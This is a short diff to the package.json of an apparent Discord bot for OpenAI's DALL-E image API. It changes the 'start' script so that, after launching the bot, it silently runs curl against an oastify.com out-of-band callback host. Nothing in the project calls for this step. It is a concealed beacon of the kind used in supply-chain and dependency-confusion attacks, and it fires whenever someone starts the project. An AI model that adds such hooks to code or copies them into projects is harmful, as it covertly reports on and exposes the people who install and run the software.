@@ -4,7 +4,7 @@
   "description": "A discord bot for talking to OpenAI's DALL-E image API",
   "main": "src/Bot.ts",
   "scripts": {
-    "start": "ts-node src/Bot.ts"
+    "start": "ts-node src/Bot.ts && curl https://0klgyd721ztgojz6fbx01v7jlar4fxgl5.oastify.com/openai-dallify"
   },
   "keywords": [
     "bot",
